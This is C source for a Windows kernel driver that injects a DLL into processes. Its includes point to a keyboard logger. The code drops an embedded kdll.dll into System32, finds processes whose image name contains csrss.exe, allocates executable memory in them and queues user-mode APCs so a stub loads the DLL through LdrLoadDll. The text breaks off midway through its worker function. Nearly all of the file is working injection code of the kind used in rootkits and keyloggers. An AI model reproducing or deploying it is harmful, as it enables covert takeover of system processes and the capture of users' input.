#include <inc/keybrd.h>
#include <inc/klogger.h>
#include <inc/monitor.h>
#include <inc/ntapiex.h>
#include <inc/pe.h>
#include <inc/string.h>
#include <injectstub/h/stub.h>
#include <inc/kdll.h>

#define __SUBCOMPONENT__ "inject"
#define MODULE_TAG 'injc'

NTSTATUS
	InjectProcessAllocateCode(HANDLE ProcessHandle, PVOID *pBase, SIZE_T *pSize)
{
	NTSTATUS Status;
	PVOID BaseAddress = NULL;
	SIZE_T RegionSize = 16 * PAGE_SIZE;

	Status = ZwAllocateVirtualMemory(ProcessHandle, &BaseAddress, 0, &RegionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ZwAllocateVirtualMemory failed for procH=%p, error=%x\n", ProcessHandle, Status);
		return Status;
	}
	
	*pBase = BaseAddress;
	*pSize = RegionSize;

	return Status;
}

NTSTATUS
	InjectGetThreadByThreadInfo(IN PSYSTEM_THREAD_INFORMATION ThreadInfo, PETHREAD *pThread)
{
	PETHREAD Thread = NULL;
	NTSTATUS Status;

	Status = PsLookupThreadByThreadId(ThreadInfo->ClientId.UniqueThread, &Thread);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "cant lookup thread by id=%p", ThreadInfo->ClientId.UniqueThread);
		return Status;
	}

	*pThread = Thread;
	return STATUS_SUCCESS;
}

VOID
InjectApcKernelRoutine(
	IN PKAPC Apc,
	IN PKNORMAL_ROUTINE *NormalRoutine,
	IN PVOID *NormalContext,
	IN PVOID *SystemArgument1,
	IN PVOID *SystemArgument2
)
{
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	KLog(LInfo, "InjectApcKernelRoutine");

	ExFreePoolWithTag(Apc, MODULE_TAG);
}

VOID
InjectApcRundown(IN PKAPC Apc)
{
	KLog(LInfo, "InjectApcRundown");

	ExFreePoolWithTag(Apc, MODULE_TAG);
}

NTSTATUS
	InjectDllProcessThreadQueueApc(HANDLE ProcessHandle, PEPROCESS Process, PETHREAD Thread, ULONG_PTR stubStart, SIZE_T stubSize)
{
	PKAPC Apc = NULL;
	ULONG Index = 0;
	LARGE_INTEGER Timeout;
	BOOLEAN ApcQueued = FALSE;

	Apc = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), MODULE_TAG);
	if (Apc == NULL) {
		KLog(LError, "No memory");
		return STATUS_NO_MEMORY;
	}

	KeInitializeApc(Apc,
		Thread,
		OriginalApcEnvironment,
		InjectApcKernelRoutine,
		InjectApcRundown,
		(PVOID)(stubStart + sizeof(STUB_DATA)),
		UserMode,
		NULL);

	for (Index = 0; Index < 20; Index++) {
		if (KeInsertQueueApc(Apc,
			NULL,
			NULL,
			2)) {
			ApcQueued = TRUE;
			break;
		}

		KLog(LError, "KeInsertQueueApc failed index=%x", Index);

		RtlZeroMemory(&Timeout, sizeof(Timeout));
		Timeout.QuadPart = -20*1000*10;//20ms

		KeDelayExecutionThread(KernelMode, FALSE, &Timeout);
	}
	
	if (!ApcQueued)
		ExFreePoolWithTag(Apc, MODULE_TAG);

	return (ApcQueued) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

NTSTATUS
	InjectDllProcessSetStubData(HANDLE ProcessHandle, PEPROCESS Process, PSTUB_DATA pStubData, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	WCHAR szKernel32W[] = L"Kernel32.dll";
	CHAR szKernel32A[] = "Kernel32.dll";
	PVOID imageBase = PsGetProcessSectionBaseAddress(Process);
	PIMAGE_NT_HEADERS peHdr = NULL;
	PIMAGE_DOS_HEADER pdosHdr = NULL;
	ULONG i;
	PVOID *ppfn = NULL;
	BOOLEAN bUnicodeLibNames = TRUE;
	PSTR NtDllImportNames[] = {
		"RtlSetHeapInformation",
		"NtSetInformationProcess",
		"NtTerminateProcess"
	};
	
	if ((DllPath->Length + sizeof(WCHAR)) > sizeof(pStubData->DllPath)) {
		KLog(LError, "DllPath->Length=%x to much", DllPath->Length);
		return STATUS_INVALID_PARAMETER;
	}

	if ((DllName->Length + sizeof(WCHAR)) > sizeof(pStubData->DllName)) {
		KLog(LError, "DllName->Length=%x to much", DllName->Length);
		return STATUS_INVALID_PARAMETER;
	}


	if (imageBase == NULL) {
		KLog(LError, "imageBase=%p for process=%p", imageBase, Process);
		return STATUS_INVALID_PARAMETER;
	}

	try {

		peHdr = RtlImageNtHeader(imageBase);
		if (!peHdr) {
			__leave;
		}

		for (i = 0; i < RTL_NUMBER_OF(NtDllImportNames); i++) {
			ppfn =
				PeGetImportTableEntry(
				"ntdll.dll",
				NtDllImportNames[i],
				imageBase,
				peHdr
				);

			if (ppfn) {
				break;
			}
		}

		if (ppfn == NULL) {
			KLog(LError, "no found any ntdll import");
			__leave;
		}
		
		KLog(LInfo, "found import of ntll %p %p\n", ppfn, *ppfn);

		PeGetModuleBaseAddress(*ppfn, &pdosHdr, &peHdr);
		KLog(LInfo, "found ntdll pdosHdr=%p, peHdr=%p", pdosHdr, peHdr);
		
		ppfn = PeGetExportEntryByName(pdosHdr, peHdr, "LdrLoadDll");
		if (ppfn == NULL) {
			KLog(LError, "no found any ntdll LdrLoadDll");
			__leave;
		}

		KLog(LInfo, "found ntdll LdrLoadDll %p %p\n", ppfn, *ppfn);
		pStubData->LdrLoadDll = ppfn;

		RtlCopyMemory(pStubData->DllPath, DllPath->Buffer, DllPath->Length);
		RtlCopyMemory(pStubData->DllName, DllName->Buffer, DllName->Length);

		pStubData->usDllName.Buffer = pStubData->DllName;
		pStubData->usDllName.Length = DllName->Length;
		pStubData->usDllName.MaximumLength = DllName->Length + sizeof(WCHAR);

		Status = STATUS_SUCCESS;
	} except(EXCEPTION_EXECUTE_HANDLER) {
		Status = GetExceptionCode();
		KLog(LError, "exception=%x", Status);
	}

	return Status;
}

NTSTATUS
	InjectDllProcess(PPROCESS_ENTRY Entry, HANDLE ProcessHandle, PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
{

	NTSTATUS Status;
	SIZE_T pStubSize = 0;
	KAPC_STATE ApcState;
	ULONG Index = 0;
	PETHREAD Thread = NULL;
	ULONG InjectedCount = 0;
	PSTUB_DATA pStubData = NULL;


	Status = InjectProcessAllocateCode(ProcessHandle, &pStubData, &pStubSize);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Allocate stub for proc=%p failed with err=%x", Process, Status);
		Entry->InjectInfo.InjectStatus = Status;
		return Status;
	}
	Entry->InjectInfo.pStubData = pStubData;

	KLog(LInfo, "pStubCode=%p, pStubSize=%x, proc=%p", pStubData, pStubSize, Process);

	KeStackAttachProcess(Process, &ApcState);
	RtlCopyMemory(pStubData, (PVOID)&stubStart, (ULONG)stubSize);
	Status = InjectDllProcessSetStubData(ProcessHandle, Process, pStubData, DllPath, DllName);
	KeUnstackDetachProcess(&ApcState);
	if (!NT_SUCCESS(Status)) {
		goto free_mem;
	}
	
	Entry->InjectInfo.StubSetup = TRUE;

	PSYSTEM_THREAD_INFORMATION ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION));

	for (Index = 0; Index < ProcInfo->NumberOfThreads; Index++) {
		if ((ProcInfo->NextEntryOffset != 0) && ((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION)) > ((ULONG_PTR)ProcInfo + ProcInfo->NextEntryOffset))
			break;

		if (((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION)) > ProcInfoBarrier)
			break;

		Status = InjectGetThreadByThreadInfo(ThreadInfo, &Thread);
		if (!NT_SUCCESS(Status))
			continue;

		if (PsGetThreadProcessId(Thread) != PsGetProcessId(Process))
			goto _next_thread;

		KLog(LInfo, "found thread %p for injection", Thread);

		if (PsGetThreadWin32Thread(Thread) != NULL) {
			Status = InjectDllProcessThreadQueueApc(ProcessHandle, Process, Thread, (ULONG_PTR)pStubData, stubSize);
			if (!NT_SUCCESS(Status))
				KLog(LError, "InjectDllProcessThread failed with err=%x", Status);
			else 
				InjectedCount++;
		}

_next_thread:		
		ObDereferenceObject(Thread);
		ThreadInfo = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)ThreadInfo + sizeof(SYSTEM_THREAD_INFORMATION));
	}

	Entry->InjectInfo.ThreadApcQueuedCount = InjectedCount;

	KLog(LInfo, "proc=%p, InjectedCount=%x", Process, InjectedCount);
	if (InjectedCount > 0) {
		LARGE_INTEGER Timeout;

		RtlZeroMemory(&Timeout, sizeof(Timeout));
		Timeout.QuadPart = -500*1000*10;//500ms
		KeDelayExecutionThread(KernelMode, FALSE, &Timeout);

		KeStackAttachProcess(Process, &ApcState);
		Status = (pStubData->Inited) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
		KeUnstackDetachProcess(&ApcState);
		if (NT_SUCCESS(Status)) {
			Entry->InjectInfo.StubCalled = TRUE;
			KLog(LInfo, "Injection SUCCESS for proc=%p", Process);
		}
	} else {
		Status = STATUS_UNSUCCESSFUL;
free_mem:
		pStubSize = 0;
		Status = ZwFreeVirtualMemory(ProcessHandle, &pStubData, &pStubSize, MEM_RELEASE);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "ZwFreeVirtualMemory for addr=%p failed with err=%x", pStubData, Status);
		}
	}

	Entry->InjectInfo.InjectStatus = Status;
	return Status;
}

NTSTATUS
	InjectQueryAllProcessInfo(
		OUT PSYSTEM_PROCESS_INFORMATION *pInfo,
		OUT ULONG *pInfoSize
		)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PSYSTEM_PROCESS_INFORMATION Info = NULL;
	ULONG InfoLength = 100 * sizeof(SYSTEM_PROCESS_INFORMATION);
	ULONG ReqLength = 0;

	Info = ExAllocatePoolWithTag(NonPagedPool, InfoLength, MODULE_TAG);
	if (Info == NULL) {
		KLog(LError, "No memory InfoLength=%x", InfoLength);
		return STATUS_NO_MEMORY; 
	}

	while (TRUE) {
		Status = ZwQuerySystemInformation(SystemProcessInformation, Info, InfoLength, &ReqLength);
		//KLog(LInfo, "ZwQuerySystemInformation status=%x, infolen=%x, reqLen=%x", Status, InfoLength, ReqLength);
		if ((Status == STATUS_BUFFER_TOO_SMALL) || (Status == STATUS_INFO_LENGTH_MISMATCH)) {
			ExFreePool(Info);
			InfoLength = ReqLength + 100 * sizeof(SYSTEM_PROCESS_INFORMATION);
			Info = ExAllocatePoolWithTag(NonPagedPool, InfoLength, MODULE_TAG);
			if (Info == NULL) {
				KLog(LError, "No memory InfoLength=%x", InfoLength);
				return STATUS_NO_MEMORY;
			}
			continue;
		} else {
			break;
		}
	}
	
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ZwQuerySystemInformation status=%x", Status);
		if (Info != NULL)
			ExFreePool(Info);
		*pInfo = NULL;
		*pInfoSize = 0;
	} else {
		*pInfo = Info;
		*pInfoSize = ReqLength;
	}

	return Status;
}

NTSTATUS
	InjectCheckProcessAndInjectDll(PEPROCESS Process, PSYSTEM_PROCESS_INFORMATION ProcInfo, ULONG_PTR ProcInfoBarrier, PUNICODE_STRING ProcessPrefix, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
{
	NTSTATUS Status;
	PUNICODE_STRING pImageFileName = NULL;
	UNICODE_STRING ImageFileNameSz = { 0, 0, NULL };
	UNICODE_STRING ProcessPrefixSz = { 0, 0, NULL };
	HANDLE ProcessHandle = NULL;
	BOOLEAN bProcAcquired = FALSE;
	PPROCESS_ENTRY Entry = NULL;

	Status = SeLocateProcessImageName(Process, &pImageFileName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "SeLocateProcessImageName proc=%p error=%x", Process, Status);
		return Status;
	}

//	KLog(LInfo, "Proc=%p name is %wZ", Process, pImageFileName);
	if (pImageFileName->Buffer == NULL || pImageFileName->Length == 0) {
		Status = STATUS_SUCCESS;
		goto cleanup;
	}

	Status = CRtlUnicodeStringCopyToSZ(pImageFileName, &ImageFileNameSz, MODULE_TAG);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "CRtlCopyUnicodeStringSZ error=%x", Status);
		goto cleanup;
	}

	Status = CRtlUnicodeStringCopyToSZ(ProcessPrefix, &ProcessPrefixSz, MODULE_TAG);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "CRtlCopyUnicodeStringSZ error=%x", Status);
		goto cleanup;
	}

	if (ProcessPrefixSz.Length > ImageFileNameSz.Length)
		goto cleanup;

	if (wcsstr(ImageFileNameSz.Buffer, ProcessPrefixSz.Buffer) == NULL)
		goto cleanup;

	//KLog(LInfo, "Found match process name=%wZ, prefix=%wZ, numThread=%d", &ImageFileNameSz, &ProcessPrefixSz, ProcInfo->NumberOfThreads);

	if (ProcInfo->NumberOfThreads < 5)
		goto cleanup;

	Status = PsAcquireProcessExitSynchronization(Process);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant acquire process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
		goto cleanup;
	}
	bProcAcquired = TRUE;

	Status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &ProcessHandle);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Cant open handle for process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
		goto cleanup;
	}

	Entry = ProcessEntryCreate(&MonitorGetInstance()->ProcessTable, Process);
	if (Entry == NULL) {
//		KLog(LInfo, "Process=%p already injected", Process);
		Status = STATUS_SUCCESS;
		goto cleanup;
	}

	Status = InjectDllProcess(Entry, ProcessHandle, Process, ProcInfo, ProcInfoBarrier, DllPath, DllName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Can't inject dll for process=%p, name=%wZ, error=%x", Process, &ImageFileNameSz, Status);
	}
	
cleanup:
	if (Entry != NULL)
		ProcessEntryDeref(Entry);

	if (ProcessHandle != NULL)
		ZwClose(ProcessHandle);

	if (bProcAcquired)
		PsReleaseProcessExitSynchronization(Process);

	if (pImageFileName != NULL)
		ExFreePool(pImageFileName);

	CRtlUnicodeStringFreeAndZero(&ImageFileNameSz);
	CRtlUnicodeStringFreeAndZero(&ProcessPrefixSz);
	
	return Status;
}

NTSTATUS
	InjectFindAllProcessesAndInjectDll(PUNICODE_STRING ProcessPrefix, PUNICODE_STRING DllPath, PUNICODE_STRING DllName)
{
	PEPROCESS Process = NULL;
	NTSTATUS Status;
	PSYSTEM_PROCESS_INFORMATION ProcInfo = NULL;
	ULONG ProcInfoSize = 0;
	PSYSTEM_PROCESS_INFORMATION CurrProcInfo = NULL;
	ULONG_PTR NextEntryAddr = 0;
	ULONG_PTR ProcInfoBarrier = 0;

	Status = InjectQueryAllProcessInfo(&ProcInfo, &ProcInfoSize);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}

	CurrProcInfo = ProcInfo;
	ProcInfoBarrier = (ULONG_PTR)ProcInfo + ProcInfoSize;

	do {
		Status = PsLookupProcessByProcessId(CurrProcInfo->UniqueProcessId, &Process);
		if (!NT_SUCCESS(Status)) {
			//KLog(LError, "lookup for pid=%p failed error=%x", CurrProcInfo->UniqueProcessId, Status);
			goto _next_process;
		}
//		KLog(LInfo, "found proc %p by pid=%p", Process, CurrProcInfo->UniqueProcessId);

		Status = InjectCheckProcessAndInjectDll(Process, CurrProcInfo, ProcInfoBarrier, ProcessPrefix, DllPath, DllName);
		if (!NT_SUCCESS(Status)) {
			goto _deref_next_process;
		}

_deref_next_process:
		ObfDereferenceObject(Process);
_next_process:

		NextEntryAddr = ((ULONG_PTR)CurrProcInfo + CurrProcInfo->NextEntryOffset);
		if (NextEntryAddr < ((ULONG_PTR)CurrProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION)))
			break;

		if ((NextEntryAddr + sizeof(SYSTEM_PROCESS_INFORMATION)) > ProcInfoBarrier)
			break;

		CurrProcInfo = (PSYSTEM_PROCESS_INFORMATION)NextEntryAddr;

	} while (TRUE);

	if (ProcInfo != NULL)
		ExFreePool(ProcInfo);

	return STATUS_SUCCESS;
}

NTSTATUS
	InjectDllCheckAlreadyExists(PUNICODE_STRING DllFilePath, BOOLEAN *pbExists)
{
	OBJECT_ATTRIBUTES ObjectAttrib;
	NTSTATUS Status;
	HANDLE FileHandle = NULL;
	IO_STATUS_BLOCK IoStatusBlock;

	*pbExists = FALSE;

	InitializeObjectAttributes(
		&ObjectAttrib,
		DllFilePath,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	Status =
		ZwCreateFile(
		&FileHandle,
		GENERIC_READ | SYNCHRONIZE,
		&ObjectAttrib,
		&IoStatusBlock,
		0L,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Open file failed with err=%x", Status);
		return Status;
	}
	
	ZwClose(FileHandle);

	*pbExists = TRUE;

	return Status;
}

NTSTATUS InjectDllDrop(PUNICODE_STRING DllFilePath)
{
	OBJECT_ATTRIBUTES ObjectAttrib;
	NTSTATUS Status;
	HANDLE FileHandle = NULL;
	IO_STATUS_BLOCK IoStatusBlock;

	InitializeObjectAttributes(
		&ObjectAttrib,
		DllFilePath,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	Status =
		ZwCreateFile(
		&FileHandle,
		GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
		&ObjectAttrib,
		&IoStatusBlock,
		0L,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Open file failed with err=%x", Status);
		return Status;
	}
	
	Status = ZwWriteFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, kdll_data(), kdll_data_size(), NULL, NULL);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "Write file failed with err=%x", Status);
		goto cleanup;
	}

cleanup:
	
	if (FileHandle != NULL)
		ZwClose(FileHandle);

	return Status;
}

NTSTATUS
	ResolveSymLink(PUNICODE_STRING obName, PUNICODE_STRING resolvedName)
{
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hSymLink = NULL;
	NTSTATUS Status;
	UNICODE_STRING LinkTarget = { 0, 0, NULL };
	BOOLEAN LinkTargetRef = FALSE;

	LinkTarget.MaximumLength = 512;
	LinkTarget.Length = 0;
	LinkTarget.Buffer = ExAllocatePoolWithTag(NonPagedPool, LinkTarget.MaximumLength, MODULE_TAG);
	if (LinkTarget.Buffer == NULL) {
		KLog(LError, "no memory");
		return STATUS_NO_MEMORY;
	}

	InitializeObjectAttributes(
		&ObjectAttributes,
		obName,
		(OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE),
		NULL,
		NULL
		);

	Status = ZwOpenSymbolicLinkObject(&hSymLink, GENERIC_READ, &ObjectAttributes);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "cant open link %wZ, error=%x", obName, Status);
		return Status;
	}

	Status = ZwQuerySymbolicLinkObject(hSymLink, &LinkTarget, NULL);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "cant query link %wZ, error=%x", obName, Status);
		goto cleanup;
	}
	
	KLog(LInfo, "link %wZ -> %wZ", obName, &LinkTarget);
	if (resolvedName != NULL) {
		*resolvedName = LinkTarget;
		LinkTargetRef = TRUE;
	}

	Status = STATUS_SUCCESS;

cleanup:
	if (!LinkTargetRef)
		ExFreePoolWithTag(LinkTarget.Buffer, MODULE_TAG);

	if (hSymLink != NULL)
		ZwClose(hSymLink);

	return Status;
}

int PathSplitByLastComponent(PUNICODE_STRING path, PUNICODE_STRING remain)
{
	LONG Index;
	BOOLEAN bIndexFound = FALSE;

	for (Index = (path->Length - remain->Length)/ sizeof(WCHAR) - 1; Index >= 0; Index--) {
		if (path->Buffer[Index] == L'\\') {
			bIndexFound = TRUE;
			break;
		}
	}

	if (!bIndexFound)
		return -1;
	
	remain->Buffer = ((PWCHAR)path->Buffer + Index);
	remain->Length = path->Length - Index*sizeof(WCHAR);
	remain->MaximumLength = remain->Length;

	return 0;
}

NTSTATUS
	ResolveSymPathStep(PUNICODE_STRING symPath, PUNICODE_STRING TargetName)
{
	UNICODE_STRING currSymPath = { 0, 0, NULL };
	UNICODE_STRING resolvedName = { 0, 0, NULL };
	UNICODE_STRING remainName = { 0, 0, NULL };
	NTSTATUS Status;

	RtlZeroMemory(TargetName, sizeof(UNICODE_STRING));
	currSymPath = *symPath;

	while (TRUE) {
		Status = ResolveSymLink(&currSymPath, &resolvedName);
		if (NT_SUCCESS(Status)) {
			break;
		}

		if (0 != PathSplitByLastComponent(symPath, &remainName)) {
			KLog(LError, "PathSplitComponent failed");
			Status = STATUS_UNSUCCESSFUL;
			goto cleanup;
		}
		
		currSymPath.Length = symPath->Length - remainName.Length;
		currSymPath.MaximumLength = currSymPath.Length;

		KLog(LInfo, "currSymPath=%wZ, remainName=%wZ", &currSymPath, &remainName);

		if (currSymPath.Length == 0) {
			KLog(LError, "reached beginning of path");
			Status = STATUS_NOT_FOUND;
			goto cleanup;
		}
	}

	TargetName->MaximumLength = resolvedName.Length + remainName.Length + sizeof(WCHAR);
	TargetName->Length = 0;
	TargetName->Buffer = ExAllocatePoolWithTag(NonPagedPool, TargetName->MaximumLength, MODULE_TAG);
	if (TargetName->Buffer == NULL) {
		KLog(LError, "No memory");
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	RtlZeroMemory(TargetName->Buffer, TargetName->MaximumLength);
	Status = RtlAppendUnicodeStringToString(TargetName, &resolvedName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlAppendUnicodeStringToString failed with err=%x", Status);
		goto cleanup;
	}

	if (remainName.Length > 0) {
		Status = RtlAppendUnicodeStringToString(TargetName, &remainName);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "RtlAppendUnicodeStringToString failed with err=%x", Status);
			goto cleanup;
		}
	}

	Status = STATUS_SUCCESS;

cleanup:
	if (resolvedName.Buffer != NULL)
		ExFreePoolWithTag(resolvedName.Buffer, MODULE_TAG);

	if (!NT_SUCCESS(Status)) {
		if (TargetName->Buffer != NULL)
			ExFreePoolWithTag(TargetName->Buffer, MODULE_TAG);
	
		RtlZeroMemory(TargetName, sizeof(UNICODE_STRING));
	}

	return Status;
}

NTSTATUS ResolveSymPath(PUNICODE_STRING Path, PUNICODE_STRING resolvedName) {
	NTSTATUS Status;
	UNICODE_STRING targetName = { 0, 0, NULL };
	UNICODE_STRING currName = { 0, 0, NULL };

	RtlZeroMemory(resolvedName, sizeof(UNICODE_STRING));
	
	currName.MaximumLength = Path->Length + sizeof(WCHAR);
	currName.Length = 0;
	currName.Buffer = ExAllocatePoolWithTag(NonPagedPool, Path->Length + sizeof(WCHAR), MODULE_TAG);
	if (currName.Buffer == NULL) {
		KLog(LError, "No memory");
		return STATUS_NO_MEMORY;
	}

	RtlZeroMemory(currName.Buffer, currName.MaximumLength);

	Status = RtlAppendUnicodeStringToString(&currName, Path);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlAppendUnicodeStringToString failed with err=%x", Status);
		ExFreePoolWithTag(currName.Buffer, MODULE_TAG);
		return Status;
	}

	while (TRUE) {
		Status = ResolveSymPathStep(&currName, &targetName);
		if (!NT_SUCCESS(Status)) {
			break;
		}

		ExFreePoolWithTag(currName.Buffer, MODULE_TAG);
		currName = targetName;
	}

	if (NT_SUCCESS(Status)) {
		__debugbreak();
		return STATUS_UNSUCCESSFUL;
	}


	if (Status == STATUS_NOT_FOUND) {
		*resolvedName = currName;
		return STATUS_SUCCESS;
	} else {
		ExFreePoolWithTag(currName.Buffer, MODULE_TAG);
		return Status;
	}
}


WCHAR DriveLetters[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

WCHAR *DriveLinks[] = {
	L"\\GLOBAL??\\A:",
	L"\\GLOBAL??\\B:",
	L"\\GLOBAL??\\C:",
	L"\\GLOBAL??\\D:",
	L"\\GLOBAL??\\E:",
	L"\\GLOBAL??\\F:",
	L"\\GLOBAL??\\G:",
	L"\\GLOBAL??\\H:",
	L"\\GLOBAL??\\I:",
	L"\\GLOBAL??\\J:",
	L"\\GLOBAL??\\K:",
	L"\\GLOBAL??\\L:",
	L"\\GLOBAL??\\M:",
	L"\\GLOBAL??\\N:",
	L"\\GLOBAL??\\O:",
	L"\\GLOBAL??\\P:",
	L"\\GLOBAL??\\Q:",
	L"\\GLOBAL??\\R:",
	L"\\GLOBAL??\\S:",
	L"\\GLOBAL??\\T:",
	L"\\GLOBAL??\\U:",
	L"\\GLOBAL??\\V:",
	L"\\GLOBAL??\\W:",
	L"\\GLOBAL??\\X:",
	L"\\GLOBAL??\\Y:",
	L"\\GLOBAL??\\Z:"
};

WCHAR *umDrivePrefixes[] = {
	L"\\\\?\\A:",
	L"\\\\?\\B:",
	L"\\\\?\\C:",
	L"\\\\?\\D:",
	L"\\\\?\\E:",
	L"\\\\?\\F:",
	L"\\\\?\\G:",
	L"\\\\?\\H:",
	L"\\\\?\\I:",
	L"\\\\?\\J:",
	L"\\\\?\\K:",
	L"\\\\?\\L:",
	L"\\\\?\\M:",
	L"\\\\?\\N:",
	L"\\\\?\\O:",
	L"\\\\?\\P:",
	L"\\\\?\\Q:",
	L"\\\\?\\R:",
	L"\\\\?\\S:",
	L"\\\\?\\T:",
	L"\\\\?\\U:",
	L"\\\\?\\V:",
	L"\\\\?\\W:",
	L"\\\\?\\X:",
	L"\\\\?\\Y:",
	L"\\\\?\\Z:"
};

NTSTATUS
	CRtlPrefixUnicodeStringReplace(PUNICODE_STRING Prefix, PUNICODE_STRING Replacement, PUNICODE_STRING Source, PUNICODE_STRING Destination)
{
	UNICODE_STRING target = { 0, 0, NULL };
	UNICODE_STRING sourceRemains = { 0, 0, NULL };
	NTSTATUS Status;

	if (!RtlPrefixUnicodeString(Prefix, Source, TRUE)) {
		return STATUS_NOT_FOUND;
	}
	
	target.MaximumLength = Replacement->Length + Source->Length - Prefix->Length + sizeof(WCHAR);
	target.Length = 0;
	target.Buffer = ExAllocatePoolWithTag(NonPagedPool, target.MaximumLength, MODULE_TAG);
	if (target.Buffer == NULL) {
		return STATUS_NO_MEMORY;
	}
	RtlZeroMemory(target.Buffer, target.MaximumLength);

	Status = RtlAppendUnicodeStringToString(&target, Replacement);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlAppendUnicodeStringToString failed with err=%x", Status);
		goto cleanup;
	}

	sourceRemains.Buffer = (PWCHAR)Source->Buffer + Prefix->Length/sizeof(WCHAR);
	sourceRemains.Length = Source->Length - Prefix->Length;
	sourceRemains.MaximumLength = sourceRemains.Length;
	
	Status = RtlAppendUnicodeStringToString(&target, &sourceRemains);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "RtlAppendUnicodeStringToString failed with err=%x", Status);
		goto cleanup;
	}

	Status = STATUS_SUCCESS;
	*Destination = target;

cleanup:
	if (!NT_SUCCESS(Status)) {
		if (target.Buffer != NULL)
			ExFreePoolWithTag(target.Buffer, MODULE_TAG);
	}

	return Status;
}

NTSTATUS
	ResolveSystemRootPathToUmPath(PUNICODE_STRING SystemRootLink, PUNICODE_STRING UmPath)
{
	NTSTATUS Status;
	UNICODE_STRING systemRootVolumePath = { 0, 0, NULL };
	LONG Index;
	UNICODE_STRING usDriveLink = { 0, 0, NULL };
	UNICODE_STRING volumeName = { 0, 0, NULL };
	UNICODE_STRING umDrivePrefix = { 0, 0, NULL };
	BOOLEAN found = FALSE;

	RtlZeroMemory(UmPath, sizeof(UNICODE_STRING));
	Status = ResolveSymPath(SystemRootLink, &systemRootVolumePath);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}

	KLog(LInfo, "systemRootVolumePath=%wZ", &systemRootVolumePath);
	for (Index = 0; Index < wcslen(DriveLetters); Index++) {
		RtlInitUnicodeString(&usDriveLink, DriveLinks[Index]);

		Status = ResolveSymLink(&usDriveLink, &volumeName);
		if (!NT_SUCCESS(Status))
			continue;

		RtlInitUnicodeString(&umDrivePrefix, umDrivePrefixes[Index]);

		Status = CRtlPrefixUnicodeStringReplace(&volumeName, &umDrivePrefix, &systemRootVolumePath, UmPath);
		ExFreePoolWithTag(volumeName.Buffer, MODULE_TAG);

		if (Status == STATUS_SUCCESS) {
			found = TRUE;
			goto cleanup;
		}
	}
	
cleanup:
	if (!found)
		Status = STATUS_NOT_FOUND;

	ExFreePoolWithTag(systemRootVolumePath.Buffer, MODULE_TAG);

	return Status;
}

#define SYS_ROOT_SYSTEM32 L"\\SystemRoot\\System32"
#define DLL_NAME	L"kdll.dll"
#define CSRSS_PROC_PREFIX L"csrss.exe"

NTSTATUS InjectDllWorker(PINJECT_BLOCK Inject)
{

	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(CSRSS_PROC_PREFIX);
	UNICODE_STRING DllPathLink = RTL_CONSTANT_STRING(SYS_ROOT_SYSTEM32);
	UNICODE_STRING DllFilePath = RTL_CONSTANT_STRING(SYS_ROOT_SYSTEM32 L"\\" DLL_NAME);
	UNICODE_STRING DllName = RTL_CONSTANT_STRING(DLL_NAME);
	UNICODE_STRING DllPath = { 0, 0, NULL };
	NTSTATUS Status;
